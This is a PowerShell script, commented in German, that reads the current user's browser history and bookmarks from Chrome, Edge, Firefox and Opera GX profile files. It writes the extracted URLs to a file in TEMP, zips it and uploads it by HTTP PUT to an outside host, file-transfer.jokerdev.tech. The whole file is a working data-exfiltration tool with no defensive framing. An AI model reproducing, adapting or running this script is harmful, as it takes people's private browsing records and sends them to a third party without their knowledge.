function Get-BrowserData {
    [CmdletBinding()]
    param (	
        [Parameter(Position = 1, Mandatory = $True)]
        [string]$Browser,    
        [Parameter(Position = 2, Mandatory = $True)]
        [string]$DataType
    )

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    }
    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
        $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"
    }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    }
    elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    }
    elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
    }

    if (Test-Path $Path) {
        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | ForEach-Object { $_.Matches.Value } | Sort-Object -Unique
        $Value | ForEach-Object {
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    }
    else {
        Write-Warning "Pfad nicht gefunden: $Path"
    }
}

function Upload-File {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $True)]
        [string]$FilePath,
        [Parameter(Mandatory = $True)]
        [string]$UploadUrl
    )

    if (-not (Test-Path $FilePath)) {
        Write-Error "Datei nicht gefunden: $FilePath"
        return $false
    }

    try {
        # Methode 1: Mit Invoke-RestMethod (PUT/POST)
        # Für Server die PUT akzeptieren (wie dein curl -T Beispiel)
        Write-Host "Upload von $FilePath nach $UploadUrl" -ForegroundColor Yellow
        
        # Option A: Mit Invoke-RestMethod (PUT - wie curl -T)
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        
        $result = Invoke-RestMethod -Uri $UploadUrl -Method Put -Body $fileBytes -ContentType 'application/octet-stream'
        
        # Option B: Mit Invoke-WebRequest (Alternative)
        # $result = Invoke-WebRequest -Uri $UploadUrl -Method Put -InFile $FilePath
        
        Write-Host "Upload erfolgreich!" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Error "Upload fehlgeschlagen: $_"
        return $false
    }
}

# Hauptskript
$outputFile = "$env:TEMP\BrowserData.txt"
$zipFile = "$env:TEMP\BrowserData.zip"

# Browser-Daten sammeln
"=== Browser History und Bookmarks ===" | Out-File -FilePath $outputFile -Encoding UTF8
"Erstellt am: $(Get-Date)" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
"Benutzer: $env:USERNAME" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
"" | Out-File -FilePath $outputFile -Encoding UTF8 -Append

# Alle Browser-Daten sammeln
$browsers = @(
    @{Browser = "edge"; DataType = "history"},
    @{Browser = "edge"; DataType = "bookmarks"},
    @{Browser = "chrome"; DataType = "history"},
    @{Browser = "chrome"; DataType = "bookmarks"},
    @{Browser = "firefox"; DataType = "history"},
    @{Browser = "opera"; DataType = "history"},
    @{Browser = "opera"; DataType = "bookmarks"}
)

foreach ($item in $browsers) {
    "=== $($item.Browser.ToUpper()) $($item.DataType.ToUpper()) ===" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
    $data = Get-BrowserData -Browser $item.Browser -DataType $item.DataType
    if ($data) {
        $data | Format-List | Out-File -FilePath $outputFile -Encoding UTF8 -Append
    }
    else {
        "Keine Daten gefunden oder Browser nicht installiert." | Out-File -FilePath $outputFile -Encoding UTF8 -Append
    }
    "" | Out-File -FilePath $outputFile -Encoding UTF8 -Append
}

# Datei komprimieren
try {
    Compress-Archive -Path $outputFile -DestinationPath $zipFile -Force
    Write-Host "Datei komprimiert: $zipFile" -ForegroundColor Green
}
catch {
    # Fallback falls Compress-Archive nicht verfügbar
    Write-Warning "Komprimierung fehlgeschlagen, verwende unkomprimierte Datei"
    $zipFile = $outputFile
}

# Datei hochladen
$uploadUrl = "https://file-transfer.jokerdev.tech/upload/BrowserData.zip"
$success = Upload-File -FilePath $zipFile -UploadUrl $uploadUrl

if ($success) {
    Write-Host "Daten erfolgreich gesammelt und hochgeladen!" -ForegroundColor Green
}
else {
    Write-Host "Daten gesammelt, aber Upload fehlgeschlagen. Datei unter: $zipFile" -ForegroundColor Yellow
}

# Aufräumen (optional)
# Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
# Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
